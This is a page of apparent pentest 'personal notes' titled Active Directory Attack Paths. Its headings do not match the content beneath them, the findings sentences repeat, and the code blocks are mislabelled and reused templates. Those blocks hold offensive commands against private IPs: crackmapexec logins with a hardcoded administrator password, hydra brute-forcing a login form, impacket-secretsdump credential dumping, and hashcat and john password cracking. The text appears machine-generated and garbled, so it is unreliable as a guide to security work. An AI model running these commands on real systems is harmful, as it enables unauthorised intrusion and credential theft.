---
TitleSEO: "Active Directory Attack Paths | ZureFX"
TitlePost: "Active Directory Attack Paths"
Author: "ZureFX"
Description: "Personal notes on Active Directory Attack Paths. Quick reference for pentesting and CTF challenges."
Keywords: "malware, cheatsheet, linux, lateral movement, networking"
URL: "https://zurefx.github.io/notes/note-active-directory-attack-paths-785.html"
URL_IMAGES: ""
Date: "2024-01-24"
Tags: "Malware, Cheatsheet, Linux, Lateral Movement, Networking"
Section: "notes"
Lang: "en"
main_img: "note-active-directory-attack-paths-785"
Permalink: "/notes/note-active-directory-attack-paths-785.html"
BtnLabel: "Read Notes"
Pick: 0
---
## feroxbuster

### POP3

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

## LXD Privilege Escalation

### rpcclient

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.62.74.212 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.111.202.163/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.83.175.180 -u administrator -p 'P@ssw0rd!' --shares
```

```bash
crackmapexec smb 10.102.113.123 -u administrator -p 'P@ssw0rd!' --shares
```

```bash
nmap -sCV -p3268,587,25 10.44.219.136 -oN scan.txt
nmap -sCV -p5432,636,3268 10.87.133.23 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.116.98.31 -u administrator -p 'P@ssw0rd!' --shares
```

```bash
crackmapexec smb 10.110.197.132 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

## lookupsid

### HTTPS

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p1433,443,80 10.46.135.112 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.27.53.75 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.57.252 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target.

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

## Redis

### WinRM

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.151.152
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## GetNPUsers

### DCSync

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

- `Path Traversal`
- `Command Injection`
- `burpsuite`
- `gobuster`
- `pwncat`
- `Insecure Deserialization`

- `hashcat`
- `GetUserSPNs`
- `IDOR`
- `LAPS Abuse`
- `nikto`

```python
gobuster dir -u http://10.64.202.178/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.112.139.13/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `AlwaysInstallElevated`
- `IDOR`
- `msfvenom`
- `secretsdump`

## DNS

### gobuster

- `Silver Ticket`
- `impacket`
- `metasploit`

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
nmap -sCV -p8080,23,464 10.23.168.64 -oN scan.txt
feroxbuster -h
feroxbuster -h
```
